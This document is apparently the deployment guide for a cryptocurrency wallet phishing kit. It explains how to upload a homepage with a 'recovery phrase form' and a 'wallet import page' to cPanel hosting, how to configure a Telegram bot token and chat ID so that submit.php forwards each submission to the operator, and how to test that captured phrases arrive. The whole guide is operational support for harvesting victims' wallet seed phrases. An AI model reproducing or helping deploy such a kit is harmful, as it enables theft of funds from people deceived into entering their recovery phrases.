# 🚀 cPanel Deployment Guide

## Quick Start - Deploy in 5 Minutes!

### Step 1: Prepare Your Files
All files are ready to upload. The main files you need are:
- `index.html` (Homepage)
- `submit.php` (Form handler)
- `config.php` (Telegram configuration)
- `wallet/` folder (Wallet import page)
- All CSS, images, and font files

### Step 2: Upload to cPanel

1. **Login to cPanel**
   - Go to your cPanel dashboard
   - Navigate to **File Manager**

2. **Upload Files**
   - Go to `public_html` folder (or your domain's root folder)
   - Upload ALL files and folders from this package
   - Make sure to maintain the folder structure:
     ```
     public_html/
     ├── index.html
     ├── submit.php
     ├── config.php
     ├── .htaccess
     ├── wallet/
     │   └── index.html
     ├── css files
     ├── images
     └── fonts
     ```

3. **Set File Permissions**
   - Right-click on `submit.php` → Change Permissions → Set to `644`
   - Right-click on `config.php` → Change Permissions → Set to `644`
   - Right-click on `.htaccess` → Change Permissions → Set to `644`

### Step 3: Configure Telegram (IMPORTANT!)

1. **Edit config.php**
   - In cPanel File Manager, right-click `config.php` → Edit
   - Verify your Telegram Bot Token and Chat ID are correct:
     ```php
     define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN');
     define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID');
     ```
   - Save the file

2. **Get Your Telegram Credentials** (if needed):
   - **Bot Token**: Message @BotFather on Telegram → Create a bot → Copy token
   - **Chat ID**: Message @userinfobot on Telegram → Copy your Chat ID

### Step 4: Test Your Deployment

1. **Test Telegram Connection**
   - Visit: `https://yourdomain.com/test_telegram.php`
   - You should receive a test message in Telegram
   - ✅ If successful, delete `test_telegram.php` for security

2. **Test the Homepage**
   - Visit: `https://yourdomain.com/`
   - Try submitting the recovery phrase form

3. **Test the Wallet Page**
   - Visit: `https://yourdomain.com/wallet/`
   - Try importing a wallet (test data)
   - Check your Telegram for the notification

### Step 5: Security (Recommended)

After testing, delete these test files:
- `test_telegram.php`
- `test_form.html`
- `test_local.html`
- `QUICK_TEST.php`
- `FINAL_TEST.php`
- `TEST_SIMPLE.php`
- `SEND_TEST_NOW.php`
- `simple_test.php`
- `test_direct.php`
- `debug.php`
- `DIAGNOSE.php`

### Troubleshooting

**Problem: Form not submitting**
- Check that `submit.php` is in the root directory
- Verify file permissions (644)
- Check browser console (F12) for errors

**Problem: Telegram not receiving messages**
- Verify `config.php` has correct Bot Token and Chat ID
- Test with `test_telegram.php`
- Check cPanel error logs

**Problem: 404 errors**
- Ensure `.htaccess` file is uploaded
- Check that all files are in `public_html` folder
- Verify folder structure is correct

**Problem: PHP not working**
- Contact your hosting provider to enable PHP
- Check PHP version (requires PHP 5.6+)

### File Structure Reference

```
public_html/
├── index.html              ← Homepage
├── submit.php              ← Form handler (sends to Telegram)
├── config.php              ← Telegram configuration
├── .htaccess               ← Server configuration
├── wallet/
│   ├── index.html          ← Wallet import page
│   ├── css/
│   ├── js/
│   └── img/
├── *.css                   ← Stylesheets
├── *.png, *.jpg            ← Images
└── *.woff2                 ← Fonts
```

### Support

If you encounter issues:
1. Check cPanel error logs
2. Test with `test_telegram.php`
3. Verify all file paths are correct
4. Ensure PHP is enabled on your hosting

---

**✅ Your site is ready when:**
- Homepage loads correctly
- Wallet page loads correctly
- Form submissions send to Telegram
- You receive notifications in Telegram

**🎉 Congratulations! Your wallet recovery site is live!**

